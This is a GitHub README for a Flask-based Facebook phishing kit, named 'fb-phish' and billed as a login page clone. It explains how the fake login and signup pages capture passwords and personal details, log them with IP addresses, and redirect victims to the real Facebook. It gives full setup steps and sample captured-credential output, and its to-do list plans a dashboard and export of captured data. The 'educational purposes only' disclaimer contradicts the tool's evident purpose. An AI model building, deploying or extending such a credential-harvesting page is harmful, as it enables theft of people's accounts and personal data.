# Facebook Login Page Clone 🔐

A pixel-perfect, responsive Facebook login page clone built with HTML, CSS, JavaScript, and Python Flask. This project captures user form data and redirects to the original Facebook website.

![Facebook Clone Preview](https://img.shields.io/badge/Status-Working-brightgreen) ![Python](https://img.shields.io/badge/Python-3.7+-blue) ![Flask](https://img.shields.io/badge/Flask-2.3.3-red) ![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white) ![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white) ![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black)

## ✨ Features

- 🎨 **Pixel-Perfect UI** - Authentic Facebook login page design
- 📱 **Fully Responsive** - Works flawlessly on desktop, tablet, and mobile
- 🔄 **Interactive Signup Modal** - Complete registration form with validation
- 🐍 **Python Flask Backend** - Robust server-side handling
- 📊 **Terminal Logging** - Real-time form data capture with timestamps
- ✅ **Form Validation** - Client-side and server-side validation
- 🌐 **Auto Redirect** - Redirects to original Facebook after form submission
- 📱 **Mobile Optimized** - Special mobile layout with fixed header

## 🚀 Demo

### Desktop View

- Clean, modern Facebook-style interface
- Smooth hover effects and transitions
- Modal popup for signup form

### Mobile View

- Fixed header with Facebook branding
- Touch-friendly form inputs
- Optimized layout for small screens

## 📁 Project Structure

```
facebook-login-clone/
├── 📄 app.py                 # Flask backend server
├── 📋 requirements.txt       # Python dependencies
├── 📁 templates/
│   └── 🌐 index.html        # Main HTML template
├── 📁 static/
│   ├── 🎨 style.css         # CSS styling
│   └── ⚡ script.js         # JavaScript functionality
└── 📖 README.md             # Project documentation
```

## 🛠️ Installation & Setup

### Prerequisites

- Python 3.7 or higher
- pip (Python package installer)

### Quick Start

1. **Clone the repository**

   ```bash
   git clone https://github.com/raiyanplanet/fb-phish.git
   cd fb-phish
   ```

2. **Create the folder structure**

   ```bash
   mkdir templates static
   ```

3. **Copy the files to their respective folders:**

   - `index.html` → `templates/`
   - `style.css` → `static/`
   - `script.js` → `static/`
   - `app.py` → root directory
   - `requirements.txt` → root directory

4. **Install dependencies**

   ```bash
   pip install -r requirements.txt
   ```

5. **Run the application**

   ```bash
   python app.py
   ```

6. **Open your browser**
   ```
   http://localhost:5000
   ```

## 📱 How It Works

### Login Process

1. User enters email/phone and password
2. Form data is validated on client-side
3. Data is sent to Flask backend via POST request
4. Server logs all data to terminal with timestamp
5. User is redirected to original Facebook website

### Signup Process

1. User clicks "Create New Account"
2. Modal opens with registration form
3. User fills in personal details (name, email, birthday, gender)
4. Form validation ensures all required fields are completed
5. Data is captured and logged to terminal
6. User is redirected to original Facebook website

## 🖥️ Terminal Output Example

```
==================================================
LOGIN ATTEMPT
==================================================
Timestamp: 2025-06-27 14:30:25
Email/Phone: user@example.com
Password: userpassword123
IP Address: 127.0.0.1
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
==================================================

==================================================
SIGNUP ATTEMPT
==================================================
Timestamp: 2025-06-27 14:35:10
First Name: John
Last Name: Doe
Email: john.doe@example.com
Password: newpassword123
Birthday: 5/15/1990
Gender: male
IP Address: 127.0.0.1
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
==================================================
```

## 🎯 Features Breakdown

### Frontend Features

- **Responsive Design**: CSS Grid and Flexbox for perfect layouts
- **Interactive Elements**: Hover effects, focus states, button animations
- **Form Validation**: Real-time validation with user-friendly error messages
- **Modal System**: Smooth popup for signup form
- **Mobile-First**: Optimized for mobile devices with touch-friendly UI

### Backend Features

- **Flask Server**: Lightweight Python web server
- **Data Logging**: Comprehensive form data capture
- **Error Handling**: Robust error handling and user feedback
- **Security Headers**: Basic security implementations
- **Health Check**: API endpoint for server status

## 🔧 Customization

### Changing Redirect URL

To change where users are redirected after login/signup, modify the redirect URLs in `app.py`:

```python
# Change this line in both login() and signup() functions:
return redirect('https://www.facebook.com')
# To your desired URL:
return redirect('https://your-website.com')
```

### Styling Modifications

Edit `static/style.css` to customize:

- Colors and themes
- Fonts and typography
- Layout and spacing
- Responsive breakpoints

### Adding New Fields

To add new form fields:

1. Update HTML in `templates/index.html`
2. Add corresponding CSS styles
3. Update JavaScript validation
4. Modify Flask backend to handle new fields

## 📊 Browser Support

- ✅ Chrome 60+
- ✅ Firefox 55+
- ✅ Safari 12+
- ✅ Edge 79+
- ✅ Mobile browsers (iOS Safari, Chrome Mobile)

## ⚠️ Important Notes

### Educational Purpose

This project is created for **educational purposes only** to demonstrate:

- Frontend development skills
- Backend integration
- Responsive web design
- Form handling and validation

### Security Considerations

- This is a demonstration project - **DO NOT** use for actual credential harvesting
- Passwords are logged in plain text for demo purposes
- No encryption or secure storage implemented
- Consider this for learning and testing only

### Legal Disclaimer

- This project mimics Facebook's design for educational purposes
- Facebook's trademarks and design are property of Meta Platforms, Inc.
- Use responsibly and in accordance with applicable laws

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request. For major changes:

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📝 To-Do

- [ ] Add HTTPS support
- [ ] Implement database storage
- [ ] Add email validation API
- [ ] Create admin dashboard
- [ ] Add export functionality for captured data
- [ ] Implement rate limiting
- [ ] Add CAPTCHA integration

## 🐛 Known Issues

- Modal may not center perfectly on very small screens (<320px)
- Birthday dropdown doesn't validate leap years perfectly
- No real-time password strength indicator

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 👨‍💻 Author

**Your Name**

- GitHub: [@yourusername](https://github.com/raiyanplanet)
- LinkedIn: [Your LinkedIn](https://linkedin.com/in/yourprofile)
- Email: your.email@example.com

## 🙏 Acknowledgments

- Facebook/Meta for the original design inspiration
- Flask community for excellent documentation
- All contributors and testers

---

⭐ **Star this repository if you found it helpful!**

![Visitor Count](https://visitor-badge.glitch.me/badge?page_id=yourusername.facebook-login-clone)
